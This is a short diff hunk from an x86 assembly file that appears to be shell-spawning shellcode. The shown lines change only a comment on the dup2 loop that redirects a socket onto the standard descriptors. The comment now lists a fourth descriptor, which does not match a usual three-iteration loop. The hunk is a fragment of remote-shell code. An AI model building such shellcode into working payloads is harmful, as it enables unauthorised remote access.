@@ -36,7 +36,7 @@ _start:
 	mov	ebx,	ebp ; copy sockfd into ebx for dup2
 	xor	ecx,	ecx ; set dup2 counter
 
-_dup2loop:          ; dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2)
+_dup2loop:          ; dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); dup2(sockfd, 3)
 	push	0x3f
 	pop	eax
 	int	0x80
